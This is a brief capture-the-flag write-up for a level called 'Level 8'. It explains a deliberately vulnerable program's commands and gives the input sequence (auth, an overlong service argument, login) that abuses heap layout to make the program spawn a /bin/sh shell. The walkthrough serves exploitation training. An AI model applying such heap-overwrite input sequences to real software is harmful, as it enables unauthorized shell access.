# Level 8

# The Code Explained

- **auth:** put in auth a malloced address
- **reset:** free auth
- **service:** will duplicate the argument onto the heap
- **login:** system("/bin/sh"); will be executed if the heap, after current auth position, is not null.

## Goal

- Use service to write after auth

## The Hack

```
auth coucou

serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

login
```
